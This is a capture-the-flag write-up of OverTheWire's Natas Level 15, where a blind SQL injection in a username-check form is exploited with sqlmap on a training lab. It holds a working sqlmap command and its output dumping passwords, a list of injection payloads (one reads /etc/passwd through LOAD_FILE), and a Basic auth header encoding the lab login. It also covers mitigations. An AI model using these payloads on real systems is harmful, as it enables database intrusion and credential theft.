# Natas Level 15: Blind SQL Injection with SQLMap

## The Setup
| Level | Username | Target URL |
| :--- | :--- | :--- |
| Level 15 | natas15 | http://natas15.natas.labs.overthewire.org |

**Introduction:** 

Natas Level 15 took SQL injection to the next level. Unlike Level 14 where I got direct feedback about successful login, this time the application only told me whether a username exists or not. No passwords were displayed, no authentication was bypassed. This is what's called a blind SQL injection vulnerability, where you can ask yes or no questions but never see the actual data. To extract information efficiently, I needed to bring in some automation with SQLMap.

---

## Hunting for Clues

When I loaded the page, I saw a minimal interface:

![natas15](image-39.png)

The page displayed "NATAS15" at the top with a simple form containing a "Username:" text field and a "Check existence" button. There was also the "View sourcecode" link in the bottom right corner, along with a "Submit token" button (part of the WEchall integration).

This looked like a username enumeration feature, which is already a security concern. But I suspected there was more to it. I clicked on "View sourcecode" to see what was happening:

```php
...
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
...
```

This source code revealed several important details:

1. **Database Schema:** The commented SQL shows the table structure. The `users` table has two columns: `username` and `password` (both varchar(64)).

2. **SQL Injection Vulnerability:** Just like Level 14, the query uses direct string concatenation:
   ```php
   $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
   ```

3. **Limited Feedback:** Unlike Level 14, the application only tells us:
   - "This user exists." if the query returns rows
   - "This user doesn't exist." if no rows are returned
   - "Error in query." if the SQL syntax is invalid

4. **No Direct Data Exposure:** The password is never displayed to the user, even if we successfully query the database.

This is a classic blind SQL injection scenario. I could inject SQL code to ask boolean questions, but extracting the actual password would require asking many yes/no questions, one character at a time. This is where automation becomes essential.

Before diving into SQLMap, I wanted to verify that the username `natas16` exists in the database. I entered "natas16" in the username field and clicked "Check existence." The page responded with "This user exists." which confirmed the next level's username was in the database.

---

## Breaking In

To efficiently exploit this blind SQL injection, I decided to use SQLMap, an automated tool for detecting and exploiting SQL injection vulnerabilities. But first, I needed to capture the HTTP request so SQLMap would know how to interact with the application.

I opened the browser DevTools with `Ctrl+Shift+I` and navigated to the Network tab:

![tab network](image-40.png)

The Network tab was now ready to capture HTTP requests. I could see it was empty with a message "Currently recording network activity." I entered "natas16" in the username field and clicked "Check existence."

![name 200](image-41.png)

Perfect! The Network tab captured the POST request to `index.php`. I could see several resources being loaded (level.css, jquery-ui.css, wechall.css, etc.), but the important one was `index.php` with a status code of 200 (shown in the Name column). The response showed "This user exists." in the main page content.

I clicked on the `index.php` entry in the Name column to inspect the request details. The DevTools opened a detailed view with multiple tabs: Headers, Payload, Preview, Response, Initiator, Timing, and Cookies. I selected the Headers tab and scrolled down to find the "Request Headers" section:

![headers](image-42.png)

I could see all the request headers in the Headers tab. I clicked on the checkbox next to "Raw" under "Request Headers" to view the raw HTTP request format. This showed the complete HTTP request including:

```
POST /index.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Cookie: _ga=GA1.1.1373864493.1771114934; _ga_RD0K2239G0=GS2.1.s1771116793$o2$g1$t1771118288$j60$l0$h0
Host: natas15.natas.labs.overthewire.org
Origin: http://natas15.natas.labs.overthewire.org
Referer: http://natas15.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
```

I copied this entire raw request header section to a text file.

Next, I needed to get the POST payload. I switched to the Payload tab and clicked on "View source":

![payload](image-43.png)

The Payload tab showed "Form Data" with the parameter `username` set to `natas16`. I clicked "View source" to see the raw format:

![content payload raw](image-44.png)

The raw payload showed: `username=natas16`

Now I had everything needed to construct a request file for SQLMap. I created a file called `req.txt` with the complete HTTP request:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/natas]
└─$ cat req.txt
POST /index.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Cookie: _ga=GA1.1.1373864493.1771114934; _ga_RD0K2239G0=GS2.1.s1771116793$o2$g1$t1771118288$j60$l0$h0
Host: natas15.natas.labs.overthewire.org
Origin: http://natas15.natas.labs.overthewire.org
Referer: http://natas15.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

username=natas16
```

Note the crucial detail: there's a blank line between the headers and the payload. This is required in the HTTP protocol to separate headers from the body.

With the request file ready, I could now run SQLMap. Since I already knew the table name (`users`) and column names (`username`, `password`) from the source code, I could directly dump the data instead of going through enumeration phases:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/natas]
└─$ sqlmap -r req.txt --dbms mysql --technique=B --batch --string "exists" --level 5 --risk 3 -p "username" --dump -T users -C "username,password"                          ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=natas16" AND 4452=4452-- hIyR
---
...
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 8.0.0
...
Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| natas16  | hPk[REDACTED]                    |
| alice    | hROtsfM734                       |
+----------+----------------------------------+
...
```

Voila! SQLMap successfully extracted all the passwords from the database, including the password for natas16.

Let me break down the SQLMap command and its flags:

- `-r req.txt` - Read the HTTP request from the file we created
- `--dbms mysql` - Specify that the database is MySQL (speeds up detection)
- `--technique=B` - Use only Boolean-based blind SQL injection techniques
- `--batch` - Never ask for user input, use default options
- `--string "exists"` - Consider a payload successful if the word "exists" appears in the response. This tells SQLMap that when it sees "This user exists." the injected query returned true.
- `--level 5` - Use more thorough testing (1-5, default is 1)
- `--risk 3` - Use riskier payloads that might alter data (1-3, default is 1)
- `-p "username"` - Force SQLMap to test only the "username" parameter
- `--dump` - Dump the table data
- `-T users` - Target the "users" table
- `-C "username,password"` - Dump only the "username" and "password" columns

**Why These Flags Were Necessary:**

1. **`--string "exists"`**: This is critical for blind SQL injection. SQLMap needs to know how to differentiate between true and false responses. By specifying "exists", we tell it that if this word appears in the response, the injected condition was true.

2. **`-p "username"`**: Forces SQLMap to focus on the username parameter and ignore its own detection results. Without this, SQLMap might incorrectly determine the parameter isn't injectable.

3. **`--level 5 --risk 3`**: These aggressive settings allow SQLMap to use payloads with double quotes (which match the source code syntax) and perform more thorough testing. Lower levels might miss the vulnerability.

SQLMap found the vulnerability using a boolean based blind injection payload:

```
username=natas16" AND 4452=4452-- hIyR
```

This payload works because:
1. The double quote closes the username string in the query
2. `AND 4452=4452` is always true, so if the user exists, the query still returns rows
3. `-- hIyR` comments out the rest of the query

SQLMap then used variations of this technique to extract each character of the password, one bit at a time, by asking questions like "Is the first character greater than 'm'?" and narrowing down the possibilities.

**The Vulnerability Breakdown:**

This challenge demonstrates **Blind SQL Injection**, a more sophisticated attack than the direct injection in Level 14:

1. **Same Root Cause:** The vulnerability stems from the same issue as Level 14 - direct string concatenation without parameterization.

2. **Limited Feedback:** The application only provides binary feedback (exists/doesn't exist), making manual exploitation time consuming.

3. **Data Extraction via Boolean Logic:** Attackers can extract data by asking yes/no questions:
   ```sql
   username=natas16" AND SUBSTRING(password,1,1)='a'-- 
   ```
   If this returns "This user exists.", the first character is 'a'. If not, try 'b', 'c', etc.

4. **Time Intensive:** Extracting a 32 character password manually would require hundreds of requests (using binary search, about 6 requests per character = 192 requests minimum).

5. **Automation is Essential:** Tools like SQLMap automate this process, making blind SQL injection practical to exploit.

**How Blind SQL Injection Works:**

The attack process:

1. **Inject Boolean Condition:** Add a condition that can be true or false
   ```sql
   SELECT * from users where username="natas16" AND 1=1--"
   ```

2. **Observe Response:** "This user exists." = True, "This user doesn't exist." = False

3. **Extract Data Bit by Bit:** Ask questions about each character:
   ```sql
   SELECT * from users where username="natas16" AND SUBSTRING(password,1,1)>'m'--"
   ```

4. **Binary Search:** Use binary search to efficiently narrow down each character (log2(64) = 6 requests per character for alphanumeric)

5. **Repeat:** Continue for each character position until the entire password is extracted

**Real World Impact:**

Blind SQL injection is particularly dangerous because:

- **Harder to Detect:** Doesn't show obvious error messages or data in responses
- **Still Fully Exploitable:** All the same attacks as regular SQL injection are possible, just slower
- **Often Overlooked:** Developers might think "we don't display the data, so it's safe"
- **Automated Tools Exist:** SQLMap and similar tools make exploitation trivial
- **Time Based Variants:** Even if boolean feedback isn't available, time based blind SQLi can use delays to infer information

**Common Blind SQL Injection Techniques:**

1. **Boolean Based Blind:**
   ```sql
   ' AND (SELECT COUNT(*) FROM users)>0--
   ```

2. **Time Based Blind:**
   ```sql
   ' AND IF(1=1, SLEEP(5), 0)--
   ```

3. **Content Based Blind:**
   ```sql
   ' AND (SELECT LOAD_FILE('/etc/passwd'))--
   ```

4. **Error Based (Semi Blind):**
   ```sql
   ' AND extractvalue(1,concat(0x7e,database()))--
   ```

**Proper Mitigation:**

The same defenses from Level 14 apply, but blind SQL injection reinforces why they're critical:

1. **Prepared Statements (Mandatory):**
   ```php
   $stmt = mysqli_prepare($link, "SELECT * from users where username=?");
   mysqli_stmt_bind_param($stmt, "s", $_REQUEST["username"]);
   mysqli_stmt_execute($stmt);
   $res = mysqli_stmt_get_result($stmt);
   ```

2. **Input Validation:** Whitelist allowed characters:
   ```php
   if (!preg_match('/^[a-zA-Z0-9_]+$/', $_REQUEST["username"])) {
       die("Invalid username format");
   }
   ```

3. **Rate Limiting:** Blind SQL injection requires many requests. Implement rate limiting:
   ```php
   // Limit to 10 requests per minute per IP
   if (requests_from_ip($ip) > 10) {
       die("Too many requests");
   }
   ```

4. **Generic Error Messages:** Don't reveal whether users exist:
   ```php
   // Bad: "User exists" vs "User doesn't exist"
   // Good: Always say "If the user exists, you'll receive an email"
   ```

5. **Web Application Firewall:** WAF rules can detect SQLMap and other automated tools.

6. **Monitor Database Queries:** Log unusual query patterns (many similar queries, substring operations, sleep calls).

7. **Least Privilege:** Database user should have minimal permissions.

---

## The Loot

**Next Level Password:** `hPk[REDACTED]`

**Quick Recap:** Exploited blind SQL injection vulnerability by capturing the HTTP request in DevTools, creating a request file, and using SQLMap with boolean based blind injection techniques to extract the password from the database.

---

## Lessons Learned

This level reinforced several advanced SQL injection concepts:

1. **Blind Doesn't Mean Safe:** Just because data isn't displayed doesn't mean it can't be extracted. Blind SQL injection is just as dangerous as traditional SQLi.

2. **Automation Changes Everything:** While manual blind SQL injection is tedious, automated tools like SQLMap make it trivial to exploit.

3. **Boolean Logic is Powerful:** By asking yes/no questions, attackers can extract any data from the database, one bit at a time.

4. **Request Inspection is Valuable:** Understanding how to capture and analyze HTTP requests in DevTools is crucial for both testing and exploitation.

5. **Time is the Only Difference:** Blind SQL injection takes longer than direct injection, but the end result is the same: complete database compromise.

6. **Defense in Depth:** Rate limiting, WAFs, and monitoring can slow down or detect blind SQL injection attacks, buying time to respond.

7. **SQLMap is Essential:** For penetration testers and security researchers, knowing how to use SQLMap effectively is a core skill.

This challenge demonstrated that obscurity (hiding the data) doesn't provide security. The same fundamental flaw (string concatenation in SQL queries) leads to the same outcome, whether the data is visible or not. Proper parameterization is the only real solution.

On to Level 16!
